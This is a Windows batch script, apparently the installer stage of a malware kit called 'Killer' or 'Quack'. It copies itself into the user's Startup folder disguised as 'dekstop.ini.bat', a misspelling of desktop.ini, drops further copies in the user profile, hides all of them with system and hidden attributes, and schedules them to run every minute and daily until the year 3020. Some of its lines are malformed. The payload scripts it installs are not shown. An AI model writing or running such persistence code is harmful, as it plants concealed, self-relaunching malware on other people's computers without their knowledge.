@ECHO OFF
color FE & mode con:cols=16 lines=1


REM if this directory exist the system must be Vista or later
IF EXIST "%AppData%\Microsoft\Windows\Start Menu\Programs\startup\" (

REM rename the file to dekstop.ini (not desktop.ini)
	copy /Y Killer.bat "%AppData%\Microsoft\Windows\Start Menu\Programs\startup\dekstop.ini.bat"
	copy /Y Killer.bat "%USERPROFILE%\Killer.vbs"
	copy /Y Killer.bat "%USERPROFILE%\Killer.bat"
	copy /Y Quack_Control_OLD.bat "%USERPROFILE%\Quack_Control_OLD.bat"
	
	attrib  +s +h "%AppData%\Microsoft\Windows\Start Menu\Programs\startup\dekstop.ini.bat"
	attrib +s +h /Y Killer.bat "%USERPROFILE%\Killer.bat"
	attrib +s +h Quack_Control_OLD.bat "%USERPROFILE%\Quack_Control_OLD.bat"
	attrib +s +h "%USERPROFILE%\Killer.vbs"
	
	schtasks /Create /SC MINUTE /MO 1  /ED 12/11/3020 /F /TN Quack /TR %AppData%\Microsoft\Windows\Start Menu\Programs\startup\dekstop.ini.bat
	schtasks /Create /SC DAILY /MO 1  /ED 12/11/3020 /F /TN Quack /TR %USERPROFILE%\Killer.bat
	
	cmd.exe /c start /min "%AppData%\Microsoft\Windows\Start Menu\Programs\startup\dekstop.ini.bat " & exit
	

  
REM else the system must be Xp or earlier
) ELSE (

	copy /Y Killer.bat "%UserProfile%\Start Menu\Startup\dekstop.ini.bat"
	copy /Y Killer.bat "%USERPROFILE%\Killer.vbs"
	copy /Y Killer.bat "%USERPROFILE%\Killer.bat"
	copy /Y Quack_Control_OLD.bat "%USERPROFILE%\Quack_Control_OLD.bat"
	
	attrib +s +h "%UserProfile%\Start Menu\Startup\dekstop.ini.bat"
	attrib +s +h /Y Killer.bat "%USERPROFILE%\Killer.bat"
	attrib +s +h Quack_Control_OLD.bat "%USERPROFILE%\Quack_Control_NEW.bat"
	attrib +s +h "%USERPROFILE%\Killer.vbs"
	
	schtasks /Create /SC MINUTE /MO 1  /ED 12/11/3020 /F /TN Quack /TR %AppData%\Microsoft\Windows\Start Menu\Programs\startup\dekstop.ini.bat
	schtasks /Create /SC DAILY /MO 1  /ED 12/11/3020 /F /TN Quack /TR %USERPROFILE%\Killer.bat
	
    cmd.exe /c start /min "%UserProfile%\Start Menu\Startup\dekstop.ini.bat" & exit
)